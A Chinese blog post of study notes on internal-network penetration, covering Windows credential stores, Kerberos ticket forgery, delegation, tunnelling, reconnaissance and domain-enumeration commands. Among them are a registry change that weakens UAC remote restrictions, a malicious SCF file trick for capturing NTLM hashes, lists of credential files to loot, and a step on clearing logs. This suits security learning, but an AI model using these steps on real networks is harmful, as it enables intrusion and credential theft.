

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
  <link rel="icon" href="/img/bz.jpg">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="z2zQAQ">
  <meta name="keywords" content="">
  
    <meta name="description" content="菜鸟学习笔记">
<meta property="og:type" content="article">
<meta property="og:title" content="渗透">
<meta property="og:url" content="http://example.com/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/index.html">
<meta property="og:site_name" content="Welcome to my world">
<meta property="og:description" content="菜鸟学习笔记">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20240819104453066.png">
<meta property="og:image" content="http://example.com/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20240817201648187.png">
<meta property="og:image" content="http://example.com/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/TnjRbqFw6obmhJx2CbZc7irynwe.png">
<meta property="og:image" content="http://example.com/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/HwexbH3zSoSMVXxXSwmckufunqh.png">
<meta property="og:image" content="http://example.com/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/MC39bEdL9oVcAnx4WIXcLKjYnV5.png">
<meta property="og:image" content="http://example.com/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Ae1bbTMIMoAuUfxHsLZc1V4knlc.png">
<meta property="og:image" content="http://example.com/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20240819104247117.png">
<meta property="og:image" content="http://example.com/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20240819104348776.png">
<meta property="og:image" content="http://example.com/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/HGuhbdOYboOamKxD4rFcdGyPnEd.png">
<meta property="og:image" content="http://example.com/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20240819104900689.png">
<meta property="og:image" content="http://example.com/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/GW14bMYCLoLO8Ox8ncVci65Unwh.png">
<meta property="og:image" content="http://example.com/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/BhYsbhulCo6zlGx43RLcxLgonKh.png">
<meta property="og:image" content="http://example.com/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/PdHnbjpPXoIfJDxA4cqc5Gc2nig.png">
<meta property="og:image" content="http://example.com/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/JBFlbtySzoDfSdxTvXrchtPLnFf.png">
<meta property="og:image" content="http://example.com/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/AfB0b898oovlYXxpkAwcPMCTnye.png">
<meta property="og:image" content="http://example.com/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/LWSIbTRrJovgeQxvbY7cIY8Jnqb.png">
<meta property="og:image" content="http://example.com/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Uljwba9S8oB3aOxR3CvcpQGnnNc.png">
<meta property="og:image" content="http://example.com/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20240912111725061.png">
<meta property="og:image" content="http://example.com/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20240912110205311.png">
<meta property="og:image" content="http://example.com/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20240819105232499.png">
<meta property="og:image" content="http://example.com/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20240819105158564.png">
<meta property="og:image" content="http://example.com/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20240917230028258.png">
<meta property="og:image" content="http://example.com/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20240917230052008.png">
<meta property="og:image" content="http://example.com/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/QqhVb8pD4oClfixKgowcNisJnqd.png">
<meta property="og:image" content="http://example.com/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/VpEBbVXlVoCXg4xyKjqclkTynhe.png">
<meta property="og:image" content="http://example.com/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/VRxLbPbLboDpcKxJHhsc1fvInzh.png">
<meta property="og:image" content="http://example.com/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/EhyrbLCxVo3pzpxRZ76cK92yn8e.png">
<meta property="og:image" content="http://example.com/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/WFZ3bTsvBoBdzJxD1ZlcmCL2nhc.png">
<meta property="og:image" content="http://example.com/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/SLR6bjrYhoDHAHxgiZocgSCpn5g.png">
<meta property="og:image" content="http://example.com/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/IX6Ubug2FohidmxFGMqc3WY6nuf.png">
<meta property="og:image" content="http://example.com/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/E7orbUVrtoPXw5xMZThcwo2YnNg.png">
<meta property="og:image" content="http://example.com/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/SlULb9DgDoMK6WxHkwzcWP9onMf.png">
<meta property="og:image" content="http://example.com/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/EeXObrz16oc7RpxMmuOc9d8Intc.png">
<meta property="og:image" content="http://example.com/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/GNT1bbDYfoMl88xO6VAcECbfnUh.png">
<meta property="og:image" content="http://example.com/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/PHLcb9Jq5oj1JaxXkx7cGZT3n4e.png">
<meta property="og:image" content="http://example.com/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Dr2LbBwm2o4G9Dx3kKQcEySpn6f.png">
<meta property="og:image" content="http://example.com/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/PFVzbM6RzoMJlFxbMUec1oe7nB2.png">
<meta property="og:image" content="http://example.com/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Hn54bBGLRoNU3Ex2c6hcyE4lnkf.png">
<meta property="og:image" content="http://example.com/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/NFb1b7l4goaJW0xWReBcBvuXnSf.png">
<meta property="article:published_time" content="2024-06-27T14:59:49.000Z">
<meta property="article:modified_time" content="2024-11-21T01:19:52.921Z">
<meta property="article:author" content="z2zQAQ">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="http://example.com/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20240819104453066.png">
  
  
  
  <title>渗透 - Welcome to my world</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  



  
<link rel="stylesheet" href="/css/cloudedGlass.css">
<link rel="stylesheet" href="/z2z_custom/custom.css">
<link rel="stylesheet" href="/css/mac.css">



  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.5-a","typing":{"enable":true,"typeSpeed":80,"cursorChar":"__","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 6.3.0"></head>


<body><!-- hexo injector body_begin start --><div id="web_bg"></div><!-- hexo injector body_begin end -->
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>z2zQAQ</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/moon.jpg') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="渗透"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2024-06-27 22:59" pubdate>
          2024年6月27日 晚上
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          26k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          218 分钟
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">渗透</h1>
            
            
              <div class="markdown-body">
                
                <h1 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h1><h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="UAC"><a href="#UAC" class="headerlink" title="UAC"></a>UAC</h2><p>安全选项中的“以管理员批准模式运行所有管理员”</p>
<p>LocalAccountTokenFilterPolicy</p>
<h2 id="权限"><a href="#权限" class="headerlink" title="权限"></a>权限</h2><p>Administrator和本地管理员都属于administrator组,但是由于UAC,本地管理员部分命令需要使用“以管理员身份运行”</p>
<p>System权限大于Administrator，部分注册表需要System</p>
<p>本地无法查询组信息的时候可以用Incognito获取System</p>
<h2 id="密码相关"><a href="#密码相关" class="headerlink" title="密码相关"></a>密码相关</h2><p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20240819104453066.png" srcset="/img/loading.gif" lazyload alt="image-20240819104453066"></p>
<p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20240817201648187.png" srcset="/img/loading.gif" lazyload alt="image-20240817201648187"></p>
<p>Ntds.dit：域控下才有，包含域用户，组合组成员，凭据，gpp，被注册表下的密钥对加密的用户hash（破解需要导出system.hive文件）等信息，位于%SystemRoot%\ntds\ntds.di</p>
<p>sam：工作组环境中存储用户密码</p>
<p>ntdsutil ：卷影拷贝服务工具，建立以上被windwos锁定的二者的快照以后面抓取</p>
<p>NTFS：微软专用的文件系统</p>
<p>DCSync：通过域同步服务的GetNCChanges接口获得完整的域用户Hash列表。</p>
<p>所有dump密码都是围绕着</p>
<ul>
<li>Lsass内存Dump</li>
<li>NTDS文件解密</li>
<li>域同步获取hash</li>
</ul>
<h3 id="LM-Hash"><a href="#LM-Hash" class="headerlink" title="LM Hash"></a>LM Hash</h3><p>结构 username:RID:LM-HASH:NTLM-HASH:LM Hash:DES，</p>
<p>如果要停止使用 LM Hash,<strong>将用户的密码设置为 14 位以内，</strong> “ab35454a3435451404046” (表示 LMHash 为空值或被禁用)。</p>
<p>2008 开始默认禁用，个人版从 Windows Vista 以后，服务器版从 Wndows Sever 2003 后使用 NTLM Hash</p>
<h2 id="身份认证"><a href="#身份认证" class="headerlink" title="身份认证"></a>身份认证</h2><h3 id="SPN"><a href="#SPN" class="headerlink" title="SPN"></a>SPN</h3><p>将服务实例和服务登录账号关联起来，</p>
<h3 id="KB2871997"><a href="#KB2871997" class="headerlink" title="KB2871997"></a>KB2871997</h3><p>WindowsServer 2012 R2</p>
<p>建立了ProtectedUsers组，强制使用kerberos验证，引出了PTK，但是该补丁并不限制域内用户，一般只在域内无法PTH的时候考虑</p>
<h3 id="kerberos"><a href="#kerberos" class="headerlink" title="kerberos"></a>kerberos</h3><p><a target="_blank" rel="noopener" href="https://hackerqwq.github.io/2021/06/28/kerberos%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/#%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86%E5%8F%8A%E4%BD%9C%E7%94%A8">内网渗透之kerberos协议学习及攻击方法总结 · HacKerQWQ’s Studio</a></p>
<p>（走kerberos协议的时候必须通过域名去连接）</p>
<p>对于域内账户</p>
<p>1.当 Client 想要访问 Server 上的某个服务时,需要先向 AS 证明自己的身份（Clinet hash加密的时间戳），验证通过后 AS 会发放一个 （krbtgt hash加密）的TGT</p>
<p>2.随后 Client 再次向 TGS 证明自己的身份（解密TGT验证），验证通过后获得 TGS （也就有了ST）</p>
<p>3.最后Client用TGS去请求服务，解密成功时服务得到PAC，发送到KDC检查Client是否有相应权限</p>
<p>这个过程分为三块：<br><strong>Client 与 AS 的交互,</strong></p>
<p><strong>Client 与 TGS 的交互,</strong></p>
<p><strong>Client 与 Server 的交互。</strong><br><strong>黄金票据是伪造 TGT，白银票据则是伪造 ST</strong></p>
<p><strong>一个获得通用的身份，一个获得访问服务的权限</strong></p>
<p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/TnjRbqFw6obmhJx2CbZc7irynwe.png" srcset="/img/loading.gif" lazyload alt="截图"></p>
<h3 id="LocalAccountTokenFilterPolicy"><a href="#LocalAccountTokenFilterPolicy" class="headerlink" title="LocalAccountTokenFilterPolicy"></a>LocalAccountTokenFilterPolicy</h3><p>组环境下，<code>Windows Vista</code>以后的操作系统中，注册表中默认没有这个值，当administrator之外的用户连接护得到删除管理员凭证的令牌导致无法连接</p>
<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">reg <span class="hljs-keyword">add</span><span class="language-bash"> HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f</span><br></code></pre></td></tr></table></figure>

<p>通过以上命令添加</p>
<h2 id="网络通信"><a href="#网络通信" class="headerlink" title="网络通信"></a>网络通信</h2><p><strong>两台计算机间的通信</strong>，其实是两台计算机中应用程序（进程）与应用程序（进程）间的通信。但“IP 地址”仅能定位到计算机，如何定位到应用程序（进程）呢？答案是“协议 + 端口”。<br>如果你对同源策略有所了解就能马上反应过来，这就是 IP + 协议 + 端口<br><strong>Socket</strong> 就是一个类，封装了许多功能函数，当需要建立连接进行通信时，它会先进行初始化，然后通过内置的功能函数建立连接并完成通信（打开、读&#x2F;写 IO、关闭），其中就包含了 TCP 的三次握手。<br><strong>正向代理和反向代理</strong>本质上并无区别，正向代理即客户端代理，代理客户端，服务端不知道实际发起请求的客户端。反向代理即服务端代理，代理服务端，客户端不知道实际提供服务的服务端。<br>正向代理可以隐藏用户的信息，并能够将其作为跳板访问我们无法访问的资源，如翻墙。反向代理可以隐藏服务器的信息，保障了内网的安全，同时能够用来实现<strong>负载均衡</strong>。（负载均衡也是防御 DOS 攻击的一种方式），对于反向代理而言，客户端不知道请求的目标主机真正 ip<br>在<strong>地址转换与端口映射</strong>中，<code>静态NAT</code> 是路由器上手动配置，一个内网地址和一个公网地址相关联，一一对应。<code>动态NAT</code> 是路由器上配置一个公网 IP 地址池，当内网地址访问外网时从地址池里获取公网 IP 进行映射。当公网 IP 地址池分配完时，只能等待被占用的公网 IP 被释放后，其他主机才能获取公网 IP 访问公网。这种将源地址进行转换的方式也可称之为 SNAT（源地址转换）。<code>NAPT 网络地址端口转换</code> 是允许多个内网地址映射到同一个公网 IP 的不同端口。这种将源地址和端口进行转换的方式也可称之为 SNAPT（源地址端口转换）。<br><strong>端口转发</strong>，有时被叫做隧道，是安全壳（SSH）为网络安全通信使用的一种方法。在内网中，是没有办法直接访问外网的。但是我们可以通过路由器的 NAT 方式访问外网。<br><strong>内网穿透</strong>是当想要访问内部网络但又没有权限去操作防火墙做端口映射的情况的时候，就需要搭建一条隧道来做端口转发和流量转发。<br><strong>正向 socks</strong>：当一个机器同时存在内外网 IP 时就能在外网通过正向连接去访问其它内网机器，而且这里跳板机就相当于正向代理。因为对于攻击者来说它是可知的，而对于内网机来说，它们并不知道它们返回给跳板机的响应又被发送给了攻击者。</p>
<p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/HwexbH3zSoSMVXxXSwmckufunqh.png" srcset="/img/loading.gif" lazyload alt="截图"></p>
<p><strong>反弹 socks</strong>：当目标机器没有公网 IP，但可访问内网资源时。攻击者可以在内网跳板机上运行 EarthWorm 使其反弹到某台对外连接的内网服务器上，然后攻击者再通过外网连接到对外服务器进而进入到内网中。这里公网服务器既是正向代理也是反向代理。对于攻击者来说它是可知的，因为我们要通过它访问我们无法访问的资源；对于内网服务器（跳板机）来说它也是可知的，因为我们是在内网服务器（跳板机）上执行的反弹命令，使其反向连接到公网服务器上。而内网服务器（跳板机）在这里充当的仅是公网服务器的正向代理，因为它对于公网服务器来说是可知的，而对于其他内网机来说则是不可知的。</p>
<p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/MC39bEdL9oVcAnx4WIXcLKjYnV5.png" srcset="/img/loading.gif" lazyload alt="截图"></p>
<p>主机用户：活动目录中的主机，也叫机器用户</p>
<p>服务账户：将服务运行起来并加入域时用到的账户，例如 mysql 账户</p>
<h2 id="委派"><a href="#委派" class="headerlink" title="委派"></a>委派</h2><p>将域内用户账户的权限给予服务账户</p>
<h3 id="非约束性"><a href="#非约束性" class="headerlink" title="非约束性"></a>非约束性</h3><p>服务用户获得了用户的 TGT，获得了该用户所有的访问权限</p>
<p>1.域控默认配置</p>
<p>2.需要 SeEnableDelegationPrivilege 特权，该特权默认仅授予域管理员和企业管理员</p>
<h3 id="约束性"><a href="#约束性" class="headerlink" title="约束性"></a>约束性</h3><p>只获取了 ST，只能访问特定服务</p>
<p>分类</p>
<ol>
<li>仅使用 Kerberos，不能进行协议转换</li>
<li>使用任何身份验证协议</li>
</ol>
<h3 id="基于资源的约束性"><a href="#基于资源的约束性" class="headerlink" title="基于资源的约束性"></a>基于资源的约束性</h3><h2 id="嗅探"><a href="#嗅探" class="headerlink" title="嗅探"></a>嗅探</h2><p>利用广播和 respondor</p>
<p>windows 解析主机名：查看本地 hosts 查看 DNS 缓存和服务器 利用 LLMNR 或者 netbios</p>
<p>当内网中没有 dns 协议的时候，广播协议降级为 LLMN2 或者 netbios</p>
<p>可以构造一个 scf 恶意文件，触发降级的广播协议，respondor 截取到 ntlm hash</p>
<h2 id="基本流程"><a href="#基本流程" class="headerlink" title="基本流程"></a>基本流程</h2><ol>
<li><p>打点拿下跳板机</p>
</li>
<li><p>net user &#x2F;domain 确认位置，寻找存活主机</p>
</li>
<li><p>提权，提取 hash</p>
</li>
<li><p>横向移动，拿下更多机子以及定位 dc 位置</p>
</li>
<li><p>提权域管，拿下 dc 后提前</p>
</li>
<li><p>PTT 维权，清理日志</p>
</li>
</ol>
<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="外网部分"><a href="#外网部分" class="headerlink" title="外网部分"></a>外网部分</h2><ul>
<li><p>whois查询</p>
</li>
<li><p>备案号</p>
</li>
<li><p>c段 旁站</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-keyword">c</span>段：可以通过在线网站记录或者暴力扫描<br>旁站：同一服务器但是不同站点，需要定位资产，在线网站查询<br></code></pre></td></tr></table></figure>
</li>
<li><p>绕过CDN查真实ip</p>
<p>首先cc.chinaz查CDN供应商</p>
<p>然后历史记录，多地区ping等绕过</p>
</li>
<li><p>二级域名</p>
<p>爆破，dns解析…</p>
</li>
<li><p>数字证书</p>
<p>crt.sh</p>
</li>
<li><p>商业信息：企查查..</p>
</li>
<li><p>社交媒体，用户名，邮件收集..</p>
<p>rocketreach</p>
<p>sherlock，maigre，whatsmyname.app</p>
<p>hunter.io，phoneboock.cz，omail.io，skymem.info</p>
</li>
<li><p>源码查询</p>
<p>gitdocker，searchcode</p>
</li>
<li><p>密码泄露</p>
<p>intelx.io(文件),cirt.net，default-password.info,routerpasswords(设备)，</p>
</li>
<li><p>网站架构：服务器版本，中间件，框架，数据库版本，waf</p>
</li>
</ul>
<h2 id="判断靶标系统"><a href="#判断靶标系统" class="headerlink" title="判断靶标系统"></a>判断靶标系统</h2><h3 id="大小写"><a href="#大小写" class="headerlink" title="大小写"></a>大小写</h3><p>windows 不敏感</p>
<h3 id="TTL"><a href="#TTL" class="headerlink" title="TTL"></a>TTL</h3><p>Ping windows 一般 ttl 大于 100</p>
<h2 id="脆弱端口"><a href="#脆弱端口" class="headerlink" title="脆弱端口"></a>脆弱端口</h2><p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Ae1bbTMIMoAuUfxHsLZc1V4knlc.png" srcset="/img/loading.gif" lazyload alt="截图"></p>
<h3 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h3><p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20240819104247117.png" srcset="/img/loading.gif" lazyload alt="image-20240819104247117"></p>
<p>• 网络链接、进程、计划任务、凭证信息(shadow、私钥)、命令记录、管理员来源、hosts文件</p>
<p>• 用户目录、opt目录、根目录</p>
<p>• *.history (.bash_history .mysql_history)</p>
<p>• &#x2F;proc&#x2F;self&#x2F;*</p>
<p>• env</p>
<h2 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h2><p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20240819104348776.png" srcset="/img/loading.gif" lazyload alt="image-20240819104348776"></p>
<p>localgroup administrators  本地管理员</p>
<p>domain admins 域管理员</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">1.</span> 网络配置 ipconfig /<span class="hljs-keyword">all</span> <br> <span class="hljs-number">2.</span> 操作系统 systeminfo | findstr /B /C:&quot;OS 名称&quot; /C:&quot;OS 版本&quot; <br> <span class="hljs-number">3.</span> 软件信息 systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot; <br> <span class="hljs-number">4.</span> 服务信息 wmic /namespace:\root\securitycenter2 pathantivirusproduct <span class="hljs-keyword">GET</span> displayName,productState,pathToSignedProductExe <br> <span class="hljs-number">5.</span> 用户列表 net <span class="hljs-keyword">user</span> <br> <span class="hljs-number">6.</span> 本地管理员信息 net localgroup administrators <br> <span class="hljs-number">7.</span> 端口信息 netstat –ano <br> <span class="hljs-number">8.</span> 补丁信息 wmic qfe <span class="hljs-keyword">get</span> Caption,Description,HotFixID,InstalledOn <br> <span class="hljs-number">9.</span> 查防火墙 netsh firewall <span class="hljs-keyword">show</span> config <br> 【域内信息收集】 <br> <span class="hljs-number">1.</span>是否有域：使用ipconfig /<span class="hljs-keyword">all</span>命令可以查看网关IP地址、DNS的IP地址以及判断当前主机 <br> <span class="hljs-number">2.</span>是否在域内：通过反向解析查询命令nslookup来解析域名的IP地址，使用解析出来的IP地址进行对比，判断域控制器和 DNS服务器是否在同一台服务器上 <br> <span class="hljs-number">3.</span>登录域信息：net config workstation <br> <span class="hljs-number">4.</span>ICMP探测内网：<span class="hljs-keyword">for</span> /L %I <span class="hljs-keyword">in</span> (<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">254</span>) <span class="hljs-keyword">DO</span> @ping -w <span class="hljs-number">1</span> -n <span class="hljs-number">1</span> <span class="hljs-number">192.168</span><span class="hljs-number">.174</span>.%I | findstr &quot;TTL=&quot; <br> <span class="hljs-number">5.</span>查询域信息：net <span class="hljs-keyword">view</span> /<span class="hljs-keyword">domain</span> <br> <span class="hljs-number">6.</span>查询域主机：net <span class="hljs-keyword">view</span> /<span class="hljs-keyword">domain</span>:XXX <br> <span class="hljs-number">7.</span>查询域用户：net <span class="hljs-keyword">group</span> /<span class="hljs-keyword">domain</span> <br> <span class="hljs-number">8.</span>查找域控：Nslookup -<span class="hljs-keyword">type</span>=SRV _ldap._tcp net <span class="hljs-type">time</span> /<span class="hljs-keyword">domain</span> net <span class="hljs-keyword">group</span> &quot;Domain Controllers&quot; /<span class="hljs-keyword">domain</span> <br> <span class="hljs-number">9.</span>查域用户信息：net <span class="hljs-keyword">user</span> /<span class="hljs-keyword">domain</span> <br> <span class="hljs-number">11.</span>查询域管理员：net <span class="hljs-keyword">group</span> &quot;Domain Admins&quot; /<span class="hljs-keyword">domain</span> <br> <span class="hljs-number">12.</span>查询域sid信息：whoami /<span class="hljs-keyword">all</span><br></code></pre></td></tr></table></figure>

<p>• 网络链接、进程、凭证信息(hash、明文)、管理员来源、用户信息、组信息、共享</p>
<p>• 用户目录、 downlaod、desktop、document、recent</p>
<p>• 程序目录 ProgramData 、appdata（roaming、local）</p>
<p>• Wmic 命令系列</p>
<p>• Net 命令系列</p>
<p>• %windir%\system32*.exe</p>
